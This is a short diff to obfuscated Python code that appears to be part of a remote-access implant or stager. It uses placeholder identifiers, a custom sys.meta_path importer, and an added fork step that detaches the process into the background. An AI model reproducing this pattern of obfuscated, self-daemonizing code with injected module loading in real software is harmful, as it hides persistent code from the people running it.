@@ -3,6 +3,7 @@ import base64 as $001
 import sys as $002
 import time as $003
 import imp as $004
+import os as $178
 import threading as $005
 import Queue as $006
 import zlib as $007
@@ -260,7 +261,12 @@ def $154():
 		except:
 			pass
 	return
-
+try:
+	$179 = $178.fork()
+	if $179 != 0:
+		$002.exit()
+except:
+	pass
 $144 = $103()
 $002.meta_path = [$102()]
 $143 = $006.Queue()
